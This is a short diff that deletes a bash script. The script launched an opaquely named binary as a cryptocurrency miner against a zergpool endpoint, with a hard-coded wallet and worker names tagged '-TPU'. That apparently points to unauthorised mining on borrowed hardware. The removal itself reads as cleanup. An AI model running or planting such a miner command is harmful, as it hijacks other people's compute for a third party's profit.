@@ -1,4 +1,0 @@
-#!/bin/bash
-
-chmod +x A  >/dev/null 2>&1
-./A -v -l  verushash.asia.mine.zergpool.com:3300 -u 4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=TRX,mc=XMR  -t 32 -x
